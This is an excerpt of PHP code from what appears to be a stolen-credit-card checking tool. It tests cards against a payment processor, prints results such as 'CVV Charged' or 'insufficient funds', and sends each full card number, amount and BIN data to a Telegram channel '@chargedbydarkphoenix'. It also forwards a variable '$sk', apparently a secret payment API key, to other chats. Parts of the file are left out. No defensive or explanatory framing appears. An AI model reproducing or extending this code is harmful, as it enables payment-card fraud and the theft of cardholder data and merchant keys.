...
echo '#CHARGE CVV Charged! [amount: '.$cur.''.$amount.'.00] [refund: '.$succ.'] [receipt: <a href="'.$receipt.'">receipt_url</a>]';

$chatId = "@chargedbydarkphoenix";
$send = "Auth➔ CVV %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded! %0AAmount➔ $cur$amount %0ABinData➔ $bindata1 %0AReceipt➔ <a href='$receipt'>receipt_url</a>";
...
echo '#CVV cvc_check: pass [charge: succeeded '.$cur.''.$amount.'.00] [refund: fail]';
$send = "Auth➔ CVV %0ACC➔ <code>$card</code> %0AResponse➔ Charged! %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, 'insufficient_funds')) {
echo '#CVV cvc_check: pass [charge: fail insufficient]';
$send = "Auth➔ CVV %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: Insufficient Funds %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
elseif (strpos($result3, '"cvc_check": "pass"')) {    
echo '#CVV cvc_check: pass • '.$dcode.' ';
$send = "Auth➔ CVV %0ACC➔ <code>$card</code> %0AResponse➔ Charge Failed: $dcode %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
...
$send = "Auth➔ CVV %0ACC➔ <code>$card</code> %0AResponse➔ Charged: Refunded %0AAmount➔ $cur$amount %0ABinData➔ $bindata1";
sendMessage($chatId, $send);
sendMessage($chatIds, $sk);
}
